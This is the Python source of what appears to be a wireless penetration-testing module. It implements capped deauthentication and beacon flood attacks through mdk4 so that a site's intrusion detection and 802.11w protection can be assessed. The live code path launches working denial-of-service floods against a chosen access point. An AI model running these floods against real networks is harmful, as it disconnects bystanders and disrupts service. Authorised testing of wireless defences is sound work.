"""Frame floods: the attacks you run to find out whether anybody is watching.

Two attacks, both of which disconnect or confuse everything on the channel, and both
of which are therefore off by default, duration-capped, and described in plain
language as denial of service:

* ``deauth_flood`` — broadcast deauthentication.  The only honest use is a
  *detection* test: a site with a wireless IDS or 802.11w deployed will notice and
  respond, and a site with neither will not.  It is also the blunt way to find out
  whether clients fall back to another network.
* ``beacon_flood`` — thousands of fake beacons, which fills every client's scan list
  with rubbish and tests whether beacon-flood detection exists.

Neither is a step towards a password.  If the goal is a handshake, ``handshake`` is
the attack to run: it deauthenticates one client, twice, and stops.  These flood the
channel, and the report says so.
"""

from __future__ import annotations

import contextlib
import time
from typing import List

from ..deps import registry
from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome


class _FloodAttack(Attack):
    """Shared plumbing: run a tool, count what it sent, stop it on time."""

    tool = "mdk4"
    #: mdk4 mode letter and the flags that go with it for this attack
    mode = "d"
    mode_args: tuple = ()
    #: how long this is allowed to run, at most (seconds)
    max_seconds = 60.0
    #: what the operator is told before it starts
    warning = ""
    finding_title = ""
    finding_severity = "medium"
    finding_detail = ""

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        if self.mode == "d":
            return bool(registry.path("mdk4") or registry.path("aireplay-ng"))
        return bool(registry.path("mdk4"))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        if self.mode == "d":
            return "needs mdk4 (or aireplay-ng) for the deauth flood"
        return "needs mdk4 for the beacon flood"

    # ---------------------------------------------------------------- #
    def _command(self, ctx: AttackContext, ap: AccessPoint) -> List[str]:
        binary = registry.path("mdk4") or "mdk4"
        args = [binary, ctx.monitor, self.mode]
        if ap.channel and self.mode in ("d", "b"):
            args += ["-c", str(ap.channel)]
        if self.mode == "d":
            args += ["-t", ap.bssid]
        return args + list(self.mode_args)

    def _count_sent(self, lines: List[str]) -> int:
        """Frames the tool reports, when it reports; the default is 0 (unknown)."""
        total = 0
        for line in lines[-400:]:
            for token in line.replace(",", " ").split():
                if token.isdigit() and len(token) >= 3:
                    total = max(total, int(token))
        return total

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        seconds = min(ctx.config.attack_timeout_for(self.name), self.max_seconds)
        ctx.bus.log(f"{self.label} against {ap.display_name} for "
                    f"{human_duration(seconds)}: {self.warning}", level="warning")
        if ctx.demo:
            return self._demo(ctx, ap, attempt, seconds)
        return self._live(ctx, ap, attempt, seconds)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                sent: int, seconds: float, simulated: bool) -> AttackOutcome:
        detail = (f"{self.warning} — {sent:,} frame(s) in {human_duration(seconds)}"
                  + (" (simulated)" if simulated else ""))
        ctx.session.add_finding(Finding(
            kind=self.name, severity=self.finding_severity, bssid=ap.bssid,
            title=self.finding_title,
            detail=f"{self.finding_detail} {detail}"))
        ap.remember(self.name, detail, frames=sent)
        ctx.session.stats.floods_run += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, self.finding_title, detail)
        return AttackOutcome.success(self.finding_title, detail=detail,
                                     extra={"frames": sent, "seconds": round(seconds, 1),
                                            "simulated": simulated,
                                            "finding": self.finding_title,
                                            "note": ("this is a denial-of-service test; "
                                                     "the deliverable is the finding, "
                                                     "not a password")})

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        sent = 0
        started = time.time()
        step = 0
        # a believable rate: a deauth flood is thousands of frames per second, a
        # beacon flood rather fewer (each frame is much bigger)
        rate = 2200 if self.mode == "d" else 900
        while time.time() - started < min(seconds, 12) and not ctx.want_stop():
            step += 1
            sent += rate + int(time.time() * 13) % 300
            ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, step * 20),
                         detail=f"{sent:,} frame(s) sent (simulated)")
            time.sleep(0.4)
        return self._finish(ctx, ap, attempt, sent, time.time() - started, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        if not registry.path("mdk4"):
            return self._fail(
                ctx, attempt, "mdk4 missing",
                "install mdk4; for a targeted deauth without it, the handshake attack "
                "does the same job with fewer frames")
        ctx.set_channel(ap.channel)
        proc = Process(self._command(ctx, ap), name="mdk4",
                       echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "could not start mdk4", proc.error)
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < seconds:
                time.sleep(1.0)
                ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / seconds * 100),
                             detail="sending (see the log for the tool's own counters)")
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
            with contextlib.suppress(Exception):
                if proc.running:
                    proc.stop(grace=2.0)
        sent = self._count_sent(proc.lines)
        if not proc.lines:
            return self._fail(ctx, attempt, f"{self.label} produced no output",
                              "mdk4 started but said nothing: check the interface and "
                              "the mdk4 dialect (`mdk4 --help`)")
        return self._finish(ctx, ap, attempt, sent, time.time() - started, False)


class DeauthFloodAttack(_FloodAttack):
    name = "deauth_flood"
    label = "Deauthentication flood (detection test)"
    tool = "mdk4 d (or aireplay-ng -0)"
    description = ("Disconnect every client of a target for a bounded time and report "
                   "what that says about the site: a WIDS that notices and 802.11w that "
                   "refuses to break are the findings.  A denial of service, not a step "
                   "towards the password.")
    mode = "d"
    max_seconds = 60.0
    warning = ("a deauth flood disconnects every client of this AP; if the site has a "
               "wireless IDS, this is what it is looking for")
    finding_title = "Management frames are unprotected (flood delivered)"
    finding_severity = "high"
    finding_detail = ("every client of this SSID could be disconnected at will, which "
                      "means a WIDS/WIPS with 802.11w is *not* in place on this "
                      "network.")


class BeaconFloodAttack(_FloodAttack):
    name = "beacon_flood"
    label = "Beacon flood (WIDS test)"
    tool = "mdk4 b"
    description = ("Fill the channel with fake beacons and see whether anything reacts. "
                   "The finding is about detection, not about any target: an environment "
                   "with beacon-flood monitoring notices, and one without does not.")
    mode = "b"
    max_seconds = 45.0
    warning = ("a beacon flood puts hundreds of fake networks into every client's scan "
               "list; it is disruptive and is only worth doing as a detection test")
    finding_title = "Beacon flood transmitted (detection test)"
    finding_severity = "medium"
    finding_detail = ("devices in range will show phantom networks until the flood "
                      "stops; the finding is whether the site's monitoring noticed.")
